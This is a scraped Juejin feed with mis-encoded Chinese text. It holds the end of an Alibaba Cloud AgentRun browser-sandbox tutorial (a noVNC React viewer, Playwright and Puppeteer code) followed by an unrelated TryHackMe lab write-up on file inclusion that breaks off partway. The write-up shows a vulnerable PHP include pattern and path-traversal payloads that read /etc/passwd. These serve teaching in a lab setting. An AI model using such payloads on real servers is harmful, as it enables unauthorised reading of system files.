viewer_url = f<span class="hljs-string">"file:///path/to/vnc-viewer.html?url={encoded_url}"</span>
webbrowser.<span class="hljs-title function_">open</span>(viewer_url)
</code></pre>
<h3 data-id="heading-29">React åº”ç”¨é›†æˆ</h3>
<p><strong>æ ¸å¿ƒç»„ä»¶ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">VNCViewerProps</span> {
  <span class="hljs-attr">vncUrl</span>: <span class="hljs-built_in">string</span>;
  onConnect?: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
  onDisconnect?: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">VNCViewer</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">VNCViewerProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{ 
  vncUrl, 
  onConnect, 
  onDisconnect 
}</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> containerRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">let</span> <span class="hljs-attr">rfb</span>: <span class="hljs-built_in">any</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">initVNC</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (!containerRef.<span class="hljs-property">current</span> || !vncUrl) <span class="hljs-keyword">return</span>;

      <span class="hljs-keyword">const</span> { <span class="hljs-attr">default</span>: <span class="hljs-variable constant_">RFB</span> } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@novnc/novnc/core/rfb'</span>);

      rfb = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RFB</span>(containerRef.<span class="hljs-property">current</span>, vncUrl, {
        <span class="hljs-attr">shared</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">credentials</span>: { <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> }
      });

      rfb.<span class="hljs-property">scaleViewport</span> = <span class="hljs-literal">true</span>;

      rfb.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">() =&gt;</span> onConnect?.());
      rfb.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'disconnect'</span>, <span class="hljs-function">() =&gt;</span> onDisconnect?.());
    };

    <span class="hljs-title function_">initVNC</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (rfb) rfb.<span class="hljs-title function_">disconnect</span>();
    };
  }, [vncUrl, onConnect, onDisconnect]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
      <span class="hljs-attr">ref</span>=<span class="hljs-string">{containerRef}</span> 
      <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%', <span class="hljs-attr">height:</span> '<span class="hljs-attr">600px</span>', <span class="hljs-attr">background:</span> '#<span class="hljs-attr">000</span>' }} 
    /&gt;</span></span>
  );
};
</code></pre>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">VNCViewer</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./VNCViewer'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [vncUrl, setVncUrl] = useState&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">''</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/sandbox/create'</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span> })
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">setVncUrl</span>(data.<span class="hljs-property">vnc_url</span>));
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Browser Sandbox å®æ—¶ç›‘æ§<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {vncUrl ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">VNCViewer</span> 
          <span class="hljs-attr">vncUrl</span>=<span class="hljs-string">{vncUrl}</span>
          <span class="hljs-attr">onConnect</span>=<span class="hljs-string">{()</span> =&gt;</span> console.log('å·²è¿æ¥')}
          onDisconnect={() =&gt; console.log('å·²æ–­å¼€')}
        /&gt;
      ) : (
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ­£åœ¨åˆå§‹åŒ–...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<blockquote>
<p><strong>å®Œæ•´ç¤ºä¾‹ä»£ç </strong>ï¼šåŒ…å«å®Œæ•´å‰ç«¯é›†æˆç¤ºä¾‹å’Œåç«¯ API çš„ä»£ç è¯·è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faliyun%2Fagentrun-sandbox-demo" target="_blank" title="https://github.com/aliyun/agentrun-sandbox-demo" ref="nofollow noopener noreferrer">GitHub ä»“åº“</a>ã€‚</p>
</blockquote>
<h2 data-id="heading-30">Puppeteer å’Œ Playwright ç›´æ¥é›†æˆ</h2>
<p>å¦‚æœæ‚¨æ›´ç†Ÿæ‚‰ä¼ ç»Ÿçš„æµè§ˆå™¨è‡ªåŠ¨åŒ–åº“,ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ Puppeteer æˆ– Playwright è¿æ¥åˆ° Browser Sandboxã€‚</p>
<h3 data-id="heading-31">ä½¿ç”¨ Playwright</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
<span class="hljs-keyword">from</span> agentrun.<span class="hljs-property">sandbox</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">Sandbox</span>, <span class="hljs-title class_">TemplateType</span>

# åˆ›å»º <span class="hljs-title class_">Sandbox</span>
sandbox = <span class="hljs-title class_">Sandbox</span>.<span class="hljs-title function_">create</span>(
    template_type=<span class="hljs-title class_">TemplateType</span>.<span class="hljs-property">BROWSER</span>,
    template_name=<span class="hljs-string">"your-template-name"</span>,
    sandbox_idle_timeout_seconds=<span class="hljs-number">3000</span>
)

# ä½¿ç”¨ <span class="hljs-title class_">Playwright</span> è¿æ¥
<span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
    browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(sandbox.<span class="hljs-property">cdp_url</span>)
    page = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span>[<span class="hljs-number">0</span>]
    
    # æ‰§è¡Œæ“ä½œ
    page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">"https://www.example.com"</span>)
    page.<span class="hljs-title function_">screenshot</span>(path=<span class="hljs-string">"screenshot.png"</span>)
    content = page.<span class="hljs-title function_">content</span>()
    
    browser.<span class="hljs-title function_">close</span>()

# æ¸…ç†
sandbox.<span class="hljs-title function_">delete</span>()
</code></pre>
<h3 data-id="heading-32">ä½¿ç”¨ Puppeteerï¼ˆNode.jsï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">'puppeteer-core'</span>);

<span class="hljs-comment">// CDP URL ä» Sandbox è·å–</span>
<span class="hljs-keyword">const</span> cdpUrl = <span class="hljs-string">'wss://your-account.funagent-data-pre.cn-hangzhou.aliyuncs.com/sandboxes/xxx/ws/automation'</span>;

(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">connect</span>({
    <span class="hljs-attr">browserWSEndpoint</span>: cdpUrl,
    <span class="hljs-attr">defaultViewport</span>: <span class="hljs-literal">null</span>
  });

  <span class="hljs-keyword">const</span> page = (<span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">pages</span>())[<span class="hljs-number">0</span>];

  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">'https://www.example.com'</span>);
  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">screenshot</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'screenshot.png'</span> });

  <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();
})();
</code></pre>
<h2 data-id="heading-33">æ€»ç»“</h2>
<p>é€šè¿‡æœ¬æ•™ç¨‹ï¼Œæ‚¨å·²ç»å­¦ä¼šäº†ï¼š</p>
<ol>
<li><strong>AgentRun SDK åŸºç¡€</strong>: å¦‚ä½•ä½¿ç”¨ SDK åˆ›å»ºå’Œç®¡ç† Browser Sandbox</li>
<li><strong>LangChain é›†æˆ</strong>: å¦‚ä½•å°† Sandbox å°è£…ä¸º LangChain Tools</li>
<li><strong>VNC å¯è§†åŒ–</strong>: å¦‚ä½•åœ¨å‰ç«¯é›†æˆ VNC å®ç°å®æ—¶ç›‘æ§</li>
<li><strong>ç›´æ¥é›†æˆ</strong>: å¦‚ä½•ä½¿ç”¨ Puppeteer/Playwright ç›´æ¥è¿æ¥ Sandbox</li>
</ol>
<h2 data-id="heading-34">å¿«é€Ÿäº†è§£å‡½æ•°è®¡ç®— AgentRunï¼š</h2>
<p><strong>â€‹ä¸€å¥è¯ä»‹ç»ï¼šâ€‹</strong>å‡½æ•°è®¡ç®— AgentRun æ˜¯ä¸€ä¸ªä»¥é«˜ä»£ç ä¸ºæ ¸å¿ƒçš„ä¸€ç«™å¼ Agentic AI åŸºç¡€è®¾æ–½å¹³å°ã€‚ç§‰æŒç”Ÿæ€å¼€æ”¾å’Œçµæ´»ç»„è£…çš„ç†å¿µï¼Œä¸ºä¼ä¸šçº§ Agent åº”ç”¨æä¾›ä»å¼€å‘ã€éƒ¨ç½²åˆ°è¿ç»´çš„å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚</p>
<p><img src="https://img.alicdn.com/imgextra/i3/O1CN01OUeOeM1uz3stEqJ1Q_!!6000000006107-2-tps-3840-2120.png" alt="" loading="lazy"/></p>
<p>å‡½æ•°è®¡ç®— AgentRun æ¶æ„å›¾</p>
<p>AgentRun è¿è¡Œæ—¶åŸºäºé˜¿é‡Œäº‘å‡½æ•°è®¡ç®— FC æ„å»ºï¼Œç»§æ‰¿äº† Serverless è®¡ç®—æè‡´å¼¹æ€§ã€æŒ‰é‡ä»˜è´¹ã€é›¶è¿ç»´çš„æ ¸å¿ƒä¼˜åŠ¿ã€‚é€šè¿‡æ·±åº¦é›†æˆ AgentScopeã€Langchainã€RAGFlowã€Mem0 ç­‰ä¸»æµå¼€æºç”Ÿæ€ã€‚AgentRun å°† Serverless çš„æè‡´å¼¹æ€§ã€é›¶è¿ç»´å’ŒæŒ‰é‡ä»˜è´¹çš„ç‰¹æ€§ä¸ AI åŸç”Ÿåº”ç”¨åœºæ™¯æ·±åº¦èåˆï¼ŒåŠ©åŠ›ä¼ä¸šå®ç°æˆæœ¬ä¸æ•ˆç‡çš„æè‡´ä¼˜åŒ–ï¼Œ<strong>å¹³å‡ TCO é™ä½ 60%</strong>ã€‚</p>
<p><strong>â€‹è®©â€‹å¼€å‘è€…åªéœ€ä¸“æ³¨äº Agent çš„ä¸šåŠ¡é€»è¾‘åˆ›æ–°ï¼Œæ— éœ€å…³å¿ƒåº•å±‚åŸºç¡€è®¾æ–½ï¼Œè®© Agentic AI çœŸæ­£è¿›å…¥ä¼ä¸šç”Ÿäº§ç¯å¢ƒã€‚</strong></p>
<p>æ¬¢è¿åŠ å…¥â€œå‡½æ•°è®¡ç®— AgentRun å®¢æˆ·ç¾¤â€ä¸æˆ‘ä»¬äº¤æµï¼Œé’‰é’‰ç¾¤å·ï¼š134570017218ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€TryHackMeã€‘JPT-æ–‡ä»¶åŒ…å«]]></title>    <link>https://juejin.cn/post/7592610104442650634</link>    <guid>https://juejin.cn/post/7592610104442650634</guid>    <pubDate>2026-01-08T08:51:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592610104442650634" data-draft-id="7592559120118464558" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€TryHackMeã€‘JPT-æ–‡ä»¶åŒ…å«"/> <meta itemprop="keywords" content="å®‰å…¨"/> <meta itemprop="datePublished" content="2026-01-08T08:51:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·196533067211"/> <meta itemprop="url" content="https://juejin.cn/user/3194510624432521"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€TryHackMeã€‘JPT-æ–‡ä»¶åŒ…å«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3194510624432521/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·196533067211
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:51:51.000Z" title="Thu Jan 08 2026 08:51:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ï¼Ÿ</h3>
<p>æ–‡ä»¶åŒ…å«ï¼ˆFile Inclusionï¼‰æ˜¯ä¸€ç§ Web æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ URL å‚æ•°è®©ç½‘ç«™â€œè¯»å–å¹¶æ˜¾ç¤ºâ€æœåŠ¡å™¨ä¸Šä¸è¯¥è¢«è®¿é—®çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚å¯†ç é…ç½®ã€ç³»ç»Ÿæ–‡ä»¶ï¼‰ï¼Œç”šè‡³æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p>
<p>ã€ä¾‹å­ã€‘</p>
<ul>
<li>æ­£å¸¸è¯·æ±‚ï¼š <code>http://example.com/view.php?file=about.txt</code>Â â†’ æ˜¾ç¤ºÂ <code>about.txt</code></li>
<li>æœ‰æ¼æ´æ—¶ï¼šæ”»å‡»è€…æ”¹æˆï¼š <code>http://example.com/view.php?file=../../../etc/passwd</code><br/>
ç½‘ç«™é”™è¯¯åœ°è¯»å–äº† Linux ç³»ç»Ÿçš„ç”¨æˆ·æ–‡ä»¶Â <code>/etc/passwd</code>ï¼Œ<strong>å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²</strong>ã€‚</li>
</ul>
<p>ã€ä¸¤ç§ç±»å‹ã€‘</p>
<ul>
<li><strong>LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰</strong> ï¼š è¯»å–<strong>æœåŠ¡å™¨æœ¬åœ°</strong>çš„æ–‡ä»¶ï¼ˆå¦‚é…ç½®æ–‡ä»¶ã€æ—¥å¿—ã€å¯†ç ç­‰ï¼‰ã€‚</li>
<li><strong>RFIï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼‰</strong> ï¼šè®©æœåŠ¡å™¨å»åŠ è½½<strong>é»‘å®¢æ§åˆ¶çš„å¤–éƒ¨ç½‘å€</strong>ä¸Šçš„æ¶æ„ä»£ç ï¼ˆæ›´å±é™©ï¼Œå¯èƒ½ç›´æ¥æ¥ç®¡æœåŠ¡å™¨ï¼‰ã€‚</li>
</ul>
<p>ã€äº§ç”ŸåŸå› ã€‘</p>
<ul>
<li>æ–‡ä»¶åŒ…å«æ¼æ´å¸¸è§äºå„ç§ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œå¦‚Â PHPÂ ç­‰ï¼Œè¿™äº›è¯­è¨€ç¼–å†™å’Œå®ç°éƒ½å¾ˆå·®ã€‚</li>
<li>è¿™äº›æ¼æ´çš„ä¸»è¦é—®é¢˜åœ¨äºè¾“å…¥éªŒè¯ï¼Œå³<strong>ç”¨æˆ·è¾“å…¥æœªè¢«å‡€åŒ–æˆ–éªŒè¯</strong>ï¼Œ<strong>ç”¨æˆ·æ§åˆ¶å…¶å†…å®¹</strong>ã€‚</li>
<li>å½“è¾“å…¥æœªè¢«éªŒè¯æ—¶ï¼Œç”¨æˆ·å¯ä»¥å°†ä»»æ„è¾“å…¥ä¼ é€’ç»™å‡½æ•°ï¼Œä»è€Œå¼•å‘æ¼æ´ã€‚</li>
</ul>
<p>æ¯”å¦‚ PHP é‡Œå†™äº†ï¼š<code>include( $ _GET['file'])</code>ï¼Œå°†fileå‚æ•°ä½œæ–‡è·¯å¾„ç›´æ¥è¯»å–</p>
<h3 data-id="heading-1">æœ¬åœ°æ–‡ä»¶åŒ…å«</h3>
<p>ã€å®šä¹‰ã€‘</p>
<p>LFIÂ æ”»å‡»é€šå¸¸æ˜¯ç”±äºå¼€å‘è€…ç¼ºä¹å®‰å…¨æ„è¯†æ‰€è‡´ã€‚ä½¿ç”¨Â PHPÂ æ—¶ï¼Œä½¿ç”¨Â includeã€requireã€include_onceÂ å’ŒÂ require_onceÂ ç­‰å‡½æ•°ï¼Œå¾€å¾€ä¼šå¢åŠ ç½‘ç»œåº”ç”¨çš„è„†å¼±æ€§ï¼Œä½¿å¾—æ”»å‡»è€…æœ‰æœºä¼šå·çª¥æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶</p>
<p>ã€include( )ä¸ºä¾‹çš„æ¼æ´ã€‘</p>
<p><code>include()</code> æ˜¯ PHP çš„ä¸€ä¸ªè¯­å¥ï¼Œç”¨äºå°†å¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°å½“å‰è„šæœ¬ä¸­ã€‚</p>
<ul>
<li>
<p>å¦‚æœ <code>EN.php</code> çš„å†…å®¹æ˜¯ï¼š</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">h1</span>&gt;Welcome in English!&lt;/<span class="hljs-selector-tag">h1</span>&gt;
</code></pre>
<p>é‚£ä¹ˆè®¿é—® <code>index.php?lang=EN.php</code> æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šçœ‹åˆ°ï¼š</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">h1</span>&gt;Welcome in English!&lt;/<span class="hljs-selector-tag">h1</span>&gt;
</code></pre>
</li>
<li>
<p>å¦‚æœ <code>EN.php</code> åŒ…å« PHP ä»£ç ï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello, user!"</span>; <span class="hljs-meta">?&gt;</span>
</code></pre>
<p>PHP ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œæµè§ˆå™¨ä¼šçœ‹åˆ°è¾“å‡º</p>
</li>
</ul>
<p>ğŸ” è¡¥å……è¯´æ˜ï¼šPHP åœ¨è§£æ <code>include("xxx")</code> æ—¶ï¼Œä¼šæŒ‰ä»¥ä¸‹é¡ºåºæŸ¥æ‰¾æ–‡ä»¶ï¼š</p>
<ol>
<li><strong>å¦‚æœè·¯å¾„æ˜¯ç»å¯¹è·¯å¾„</strong>ï¼ˆå¦‚Â <code>/etc/passwd</code>Â æˆ–Â <code>/var/www/langs/EN.php</code>ï¼‰â†’ ç›´æ¥ä»æ ¹ç›®å½•å¼€å§‹æ‰¾ã€‚</li>
<li><strong>å¦‚æœæ˜¯ç›¸å¯¹è·¯å¾„</strong>ï¼ˆå¦‚Â <code>EN.php</code>ã€<code>langs/EN.php</code>ï¼‰â†’ ä»Â <strong>å½“å‰è„šæœ¬æ‰€åœ¨ç›®å½•</strong>Â å¼€å§‹æ‰¾ã€‚</li>
</ol>
<p>ã€å®è·µ1ã€‘</p>
<p>1ã€è¾“å…¥1ï¼Œå‘ç°Warningä¸­ä¼šæœ‰inludeï¼ˆ1ï¼‰çš„åç«¯ä»£ç </p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d3b44541e7a4470b59cf965d6c6266d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=IhbvOSCBT6QQxVMoAqQsYHE%2By9A%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€ è¾“å…¥/ect/passwd,åˆ©ç”¨includeæ¼æ´è¯»å–æœåŠ¡å™¨çš„æœ¬åœ°æ–‡ä»¶</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb893833e3ae4889a9ca3c37af07a530~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=CunBpNJtVT%2F3YJ%2FkKNZxfa1AVRk%3D" alt="image.png" loading="lazy"/></p>
<p>ã€å®éªŒ2ã€‘</p>
<p>1ã€è¾“å…¥testå®éªŒï¼Œå‘ç°includeè§„å®šè®¿é—®includesæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac39c44b8d38464e8b9f48bdbb5eceac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=ZjFnPMoJC3bZpU3FaWhGa6kZHp0%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€ä½¿ç”¨ç›®å½•ç©¿é€ï¼Œåœ¨urlå‚æ•°ä¸­ä½¿ç”¨ ../../../../etc/passwd,ç©¿é€inludesæ–‡ä»¶åˆ°è¾¾æ ¹ç›®å½•</p>
